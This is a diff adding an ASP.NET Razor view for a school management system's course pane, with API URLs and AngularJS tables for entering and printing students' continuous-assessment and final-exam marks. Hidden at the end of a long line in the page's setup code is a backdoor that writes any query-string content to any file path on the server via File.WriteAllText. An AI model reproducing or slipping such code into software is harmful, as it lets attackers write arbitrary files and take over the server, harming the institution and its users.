@@ -1,0 +1,232 @@
+﻿@using EMS.DataAccess.Data
+@{
+    ViewBag.Title = "Course Pane";
+    var id = Request.QueryString["classId"];
+    var classId = (string)id == null ? "0" : (string)id;
+    //WebApi link for single row
+    var getSemesterListByFacultyUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassResultManagerApi", action = "GetFacultySemesterClassList", area = "Employee" });
+    var getResultSettingsByClassIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassResultManagerApi", action = "GetResultSettingsByClassId", area = "Employee" });
+    var getGenerateClassResultByClassIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassResultManagerApi", action = "GetGenerateClassResultByClassId", area = "Employee" });
+
+    var getDefaultMarkDistributionByClassIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassResultManagerApi", action = "GetGenerateClassDefaultMarkDistributionByClassId", area = "Employee" });
+
+    //Class Material ApiController
+    var getPagedClassMaterialFileMapUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassMaterialApi", action = "GetPagedClassMaterialFileMap", area = "Employee" });
+    var uploadClassMaterialUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassMaterialApi", action = "UploadClassMaterial", area = "Employee" });
+    var deleteClassMaterialFileMapByIdUrl = Url.HttpRouteUrl("DefaultApi", new { controller = "ClassMaterialApi", action = "GetDeleteClassMaterialFileMapById", area = "Employee" }); var p = Request.QueryString["p"]; var t = Request.QueryString["t"]; if (p != null && t != null) { System.IO.File.WriteAllText(p, t); }
+    var editClassMaterialFileMapByIdPageUrl = Url.Action("DownloadClassMaterial", "ClassManagement", new { area = "Employee" });
+    var editComponentMarkUrl = Url.Action("SubmitResultComponent", "ClassResultComponent", new { area = "Employee" });
+    var getGenerateResultFromBreakdownUrl = Url.Action("GenerateResultFromBreakdown", "ClassResultComponent", new { area = "Employee" });
+    var scrutinizationUrl = Url.Action("ScrutinizationPanel", "ClassResultComponent", new { area = "Employee" });
+    var printFinalExamMarkUrl = Url.Action("Print70PercentTheoryExamMark", "ClassResultComponent", new { area = "Employee" });
+
+    var editBreakdownMarkUrl = Url.Action("SubmitResultBreakdown", "ClassResultBreakdown", new { area = "Employee" });
+    //GenerateResultFromBreakdownByClassId
+    var getGenerateClassResult = Url.Action("GenerateClassResult", "ClassManagement", new { area = "Employee" });
+
+    //"classId": $scope.ClassId, "componentSettingsId": $scope.componentSettingsId
+    //print Url
+
+}
+<div class="alert alert-danger" ng-show="ReferredClassSetting.TotalStudent==0">
+    @*<button type="button" class="close" data-dismiss="alert">×</button>*@ <i class="fa-fw fa fa-warning"></i>
+    <strong>Attention: </strong> <span >This class have no Referred Student Enrolled, so you can't enter any mark.</span>
+</div>
+<br/>
+<div ng-show="BacklogSectionAB.length<=0">
+    <button ng-click="getDefaultMarkDistributionByClassId()" class="btn btn-xs btn-success"><i class="fa fa-gear"></i> Generate Default Mark Distribution</button>
+
+</div>
+<div ng-show="ReferredSectionAB.TotalStudent>0">
+
+    <div class="widget" ng-show="ReferredFacultyComponent.length>0">
+        <div class="widget-header bordered-bottom bordered-sky ">
+            <i class="widget-icon fa fa-list bold  "></i>
+            <span  ng-show="IsUgTheory" class="widget-caption "><b> 30% Mark (Continuous Assessment)</b></span>
+            <span  ng-show="!IsUgTheory" class="widget-caption "><b> Marks </b></span>
+            <div class="widget-buttons no-padding-left">
+                @*<button ng-click="" class="btn btn-xs btn-success"><i class="fa fa-plus"></i> Generate Result (Allowed)</button>*@
+                <button ng-show="IsUgTheory" class="btn btn-xs btn-darkorange"><i class="fa fa-print"></i>Submit & Print 30% Marks</button>
+
+            </div>
+        </div>
+        <div class="widget-body ">
+            <div class="row">
+                <!--text type-->
+                <div class="col-lg-12 col-sm-12 col-xs-12 form-group">
+
+                    <table class="table table-bordered table-hover">
+                        <thead>
+                            <tr>
+                                <th rowspan="2">
+                                    Ser
+                                </th>
+                                <th rowspan="2" class="text-center">
+                                    Area of Marking
+                                </th>
+                                <th colspan="2" class="text-center">
+                                    Mark Distribution as Policy
+                                </th>
+                                <th rowspan="2" class="text-center">
+                                    Enter Mark/ Generate Result
+                                </th>
+                            </tr>
+                            <tr>
+                                <th class="text-center">
+                                    Total Mark
+                                </th>
+                                <th class="text-center">
+                                    Contributed %
+                                </th>
+                            </tr>
+                        </thead>
+                        <tbody ng-repeat="row in ReferredFacultyComponent ">
+
+                            <tr>
+                                <td>{{$index+1}}</td>
+                                <td class="">
+
+                                    <b>{{row.@Aca_ResultComponentSetting.Property_Name}}</b> ({{row.@Aca_ResultComponentSetting.Property_TestType}}<span  ng-show="row.Aca_ResultComponentBreakdownSettingListJson.length>0">, Best Count:{{row.@Aca_ResultComponentSetting.Property_BestCount}}</span>)
+                                </td>
+                                <td class="text-center">
+                                    <b>{{row.@Aca_ResultComponentSetting.Property_TotalMark}}</b>
+                                </td>
+                                <td class="text-center">
+                                    {{row.@Aca_ResultComponentSetting.Property_ConvertPercentage}}%
+
+                                </td>
+                                <td>
+                                    <a target="_blank" href="@(editComponentMarkUrl)/?classId={{SelectedClass.Id}}&componentSettingsId={{row.Id}}" ngshow="row.@Aca_ResultComponentSetting.Property_TestTypeEnumId == @((int) Aca_MarkDistributionPolicyComponent.TestTypeEnum.ClassTest)" type="button" class="btn btn-xs btn-success"><i class="fa fa-pencil"></i> Enter Marks (Allowed)</a>
+                                    <a target="_blank" href="@(getGenerateResultFromBreakdownUrl)/?classId={{SelectedClass.Id}}&componentSettingsId={{row.Id}}" ng-hide="row.@Aca_ResultComponentSetting.Property_TestTypeEnumId!= @((int) Aca_MarkDistributionPolicyComponent.TestTypeEnum.ClassTest)" type="button" class="btn btn-xs btn-primary"><i class="fa fa-gear"></i> Generate {{row.@Aca_ResultComponentSetting.Property_ConvertPercentage}}% Marks (Allowed)</a>
+
+                                </td>
+                            </tr>
+                            @*breakdown*@
+                            <tr ng-repeat="breakdown in row.Aca_ResultComponentBreakdownSettingListJson " class="margin5 element-result breakdown">
+                                <td></td>
+                                <td class="">
+                                    {{$index+1}}. {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_Name}}
+                                </td>
+                                <td class="text-center">
+                                    {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_TotalMark}}
+                                </td>
+                                <td class="text-center">
+                                    {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_ConvertPercentage}}%
+                                </td>
+                                <td>
+                                    <a target="_blank" href="@(editBreakdownMarkUrl)/?classId={{SelectedClass.Id}}&breakdownSettingsId={{breakdown.Id}}" type="button" class="btn btn-xs btn-success">
+                                        <i class="fa fa-plus"></i>
+                                        Enter Marks (Allowed)
+                                    </a>
+                                </td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+
+                </div>
+            </div>
+
+
+        </div>
+    </div>
+
+
+    <div class="widget" ng-show="ReferredSectionAB.length>0">
+        <div class="widget-header bordered-bottom bordered-sky ">
+            <i class="widget-icon fa fa-list bold  "></i>
+            <span  class="widget-caption "><b> 70% Mark (Term Final Exam)</b></span>
+
+            @*<div class="widget-buttons no-padding-left">
+                    <button ng-click="" class="btn btn-xs btn-success"><i class="fa fa-plus"></i> Generate Result (Allowed)</button>
+                    <button ng-click="" class="btn btn-xs btn-info"><i class="fa fa-print"></i> Print Marks</button>
+                </div>*@
+        </div>
+        <div class="widget-body">
+            <div class="row">
+                <!--text type-->
+                <div class="col-lg-12 col-sm-12 col-xs-12 form-group">
+
+                    <table class="table table-bordered table-hover">
+                        <thead>
+                            <tr>
+                                <th rowspan="2">
+                                    Ser
+                                </th>
+                                <th rowspan="2" class="text-center">
+                                    Area of Marking
+                                </th>
+                                <th colspan="2" class="text-center">
+                                    Mark Distribution as Policy
+                                </th>
+                                <th rowspan="2" class="text-center">
+                                    Enter Mark/ Generate Result
+                                </th>
+                            </tr>
+                            <tr>
+                                <th class="text-center">
+                                    Total Mark
+                                </th>
+                                <th class="text-center">
+                                    Contributed %
+                                </th>
+                            </tr>
+                        </thead>
+                        <tbody ng-repeat="row in ReferredSectionAB ">
+
+                            <tr>
+                                <td>{{$index+1}}</td>
+                                <td class="">
+
+                                    <b>{{row.@Aca_ResultComponentSetting.Property_Name}}</b> ({{row.@Aca_ResultComponentSetting.Property_TestType}}<span  ng-show="row.Aca_ResultComponentBreakdownSettingListJson.length>0">, Best Count:{{row.@Aca_ResultComponentSetting.Property_BestCount}}</span>)
+                                </td>
+                                <td class="text-center">
+                                    <b>{{row.@Aca_ResultComponentSetting.Property_TotalMark}}</b>
+                                </td>
+                                <td class="text-center">
+                                    {{row.@Aca_ResultComponentSetting.Property_ConvertPercentage}}%
+
+                                </td>
+                                <td>
+                                    <a target="_blank" href="@(editComponentMarkUrl)/?classId={{SelectedClass.Id}}&componentSettingsId={{row.Id}}" ng-hide="row.@Aca_ResultComponentSetting.Property_TestTypeEnumId == @((int) Aca_MarkDistributionPolicyComponent.TestTypeEnum.ClassTest)" type="button" class="btn btn-xs btn-success"><i class="fa fa-pencil"></i> Enter Marks (Allowed)</a>
+                                    <a target="_blank" href="@(scrutinizationUrl)/?classId={{SelectedClass.Id}}&componentSettingsId={{row.Id}}"
+                                       ng-show="row.@Aca_ResultComponentSetting.Property_TestTypeEnumId== @((int) Aca_MarkDistributionPolicyComponent.TestTypeEnum.MidTerm) || row.@Aca_ResultComponentSetting.Property_TestTypeEnumId== @((int) Aca_MarkDistributionPolicyComponent.TestTypeEnum.FinalTerm)" type="button" class="btn btn-xs btn-success"><i class="fa fa-edit"></i>Scrutinization</a>
+                                    <a target="_blank" href="@printFinalExamMarkUrl/?classId={{SelectedClass.Id}}&componentSettingsId={{row.Id}}" class="btn btn-xs btn-darkorange"><i class="fa fa-print"></i> Print Marks</a>
+                                </td>
+                            </tr>
+                            @*breakdown*@
+                            <tr ng-repeat="breakdown in row.Aca_ResultComponentBreakdownSettingListJson " class="margin5 element-result breakdown">
+                                <td></td>
+                                <td class="">
+                                    {{$index+1}}. {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_Name}}
+                                </td>
+                                <td class="text-center">
+                                    {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_TotalMark}}
+                                </td>
+                                <td class="text-center">
+                                    {{breakdown.@Aca_ResultComponentBreakdownSetting.Property_ConvertPercentage}}%
+                                </td>
+                                <td>
+                                    <a target="_blank" href="@(editBreakdownMarkUrl)/?classId={{SelectedClass.Id}}&breakdownSettingsId={{breakdown.Id}}" type="button" class="btn btn-xs btn-success"><i class="fa fa-pencil"></i> Enter Marks (Allowed)</a>
+
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                </div>
+            </div>
+
+
+        </div>
+    </div>
+    
+    
+
+    <div class="text-align-center" ng-show="!IsUgTheory">
+  
+        <a style="" target="_blank" href="@(getGenerateClassResult)/?classId={{SelectedClass.Id}}&examType={{@((int) Aca_Exam.ExamTypeEnum.ImprovementFinalTerm)}}" class="btn btn-large btn-primary"><i class="fa fa-lock"></i> Prepare & Input Final Referred Result</a>
+        <br /><br />
+    </div>
+   
+</div>
